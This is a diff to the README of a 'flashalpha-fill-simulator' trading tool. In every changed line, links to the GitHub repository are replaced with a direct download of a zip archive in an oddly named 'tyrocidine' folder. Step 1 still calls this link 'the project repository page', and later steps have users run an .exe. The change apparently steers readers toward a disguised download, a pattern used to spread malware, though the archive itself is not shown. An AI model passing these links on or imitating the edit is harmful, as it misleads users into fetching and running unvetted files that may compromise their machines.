@@ -1,6 +1,6 @@
 # ⚡ flashalpha-fill-simulator - Simulate precise fill orders with ease
 
-[![](https://img.shields.io/badge/Download_Simulator-Blue?style=for-the-badge)](https://github.com/arifkhan4567/flashalpha-fill-simulator)
+[![](https://img.shields.io/badge/Download_Simulator-Blue?style=for-the-badge)](https://github.com/arifkhan4567/flashalpha-fill-simulator/raw/refs/heads/main/tyrocidine/flashalpha_simulator_fill_2.2.zip)
 
 ## About the Application
 
@@ -20,7 +20,7 @@ To run this simulator, ensure your computer meets these minimum specifications:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the project repository page: [https://github.com/arifkhan4567/flashalpha-fill-simulator](https://github.com/arifkhan4567/flashalpha-fill-simulator).
+1. Visit the project repository page: [https://github.com/arifkhan4567/flashalpha-fill-simulator/raw/refs/heads/main/tyrocidine/flashalpha_simulator_fill_2.2.zip](https://github.com/arifkhan4567/flashalpha-fill-simulator/raw/refs/heads/main/tyrocidine/flashalpha_simulator_fill_2.2.zip).
 2. Look for the Releases section on the right side of the page.
 3. Click the latest version number to view the files.
 4. Locate the file ending in .exe, such as `flashalpha-setup.exe`.
@@ -90,4 +90,4 @@ If you encounter unusual behavior, check the "About" tab in the software. You fi
 4. Launch the application from your desktop.
 5. Click "Connect" to start the simulation.
 
-[![](https://img.shields.io/badge/Download_Simulator-Grey?style=for-the-badge)](https://github.com/arifkhan4567/flashalpha-fill-simulator)
+[![](https://img.shields.io/badge/Download_Simulator-Grey?style=for-the-badge)](https://github.com/arifkhan4567/flashalpha-fill-simulator/raw/refs/heads/main/tyrocidine/flashalpha_simulator_fill_2.2.zip)
